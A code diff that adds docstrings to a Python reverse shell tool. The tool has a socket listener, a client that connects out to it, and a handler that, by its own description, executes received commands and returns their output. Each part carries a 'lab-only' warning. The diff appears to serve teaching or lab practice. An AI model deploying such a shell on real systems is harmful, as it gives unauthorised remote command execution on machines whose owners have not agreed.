@@ -17,6 +17,19 @@ import threading
 
 
 def listen(host: str, port: int) -> None:
+    """
+    Start reverse shell listener.
+    
+    Binds to specified host and port, accepts a single connection,
+    and provides an interactive shell interface.
+    
+    Args:
+        host: Host address to bind to (use "0.0.0.0" for all interfaces).
+        port: Port number to listen on.
+        
+    Warning:
+        Lab-only. Do not expose to the internet.
+    """
     print("⚠️  Lab-only reverse shell listener. Do not expose to the internet.")
     srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -41,6 +54,15 @@ def listen(host: str, port: int) -> None:
 
 
 def handle_recv(sock: socket.socket) -> None:
+    """
+    Handle incoming commands from reverse shell connection.
+    
+    Receives commands, executes them via subprocess, and sends output back.
+    Runs in a separate thread to handle bidirectional communication.
+    
+    Args:
+        sock: Connected socket for command/response exchange.
+    """
     while True:
         data = sock.recv(1024)
         if not data:
@@ -51,6 +73,19 @@ def handle_recv(sock: socket.socket) -> None:
 
 
 def connect(host: str, port: int) -> None:
+    """
+    Connect to reverse shell listener.
+    
+    Establishes connection to listener and starts command handler thread.
+    Keeps connection alive until interrupted.
+    
+    Args:
+        host: Listener hostname or IP address.
+        port: Listener port number.
+        
+    Warning:
+        Lab-only. Run only inside isolated lab environment.
+    """
     print("⚠️  Lab-only client. Run only inside an isolated lab you own.")
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.connect((host, port))
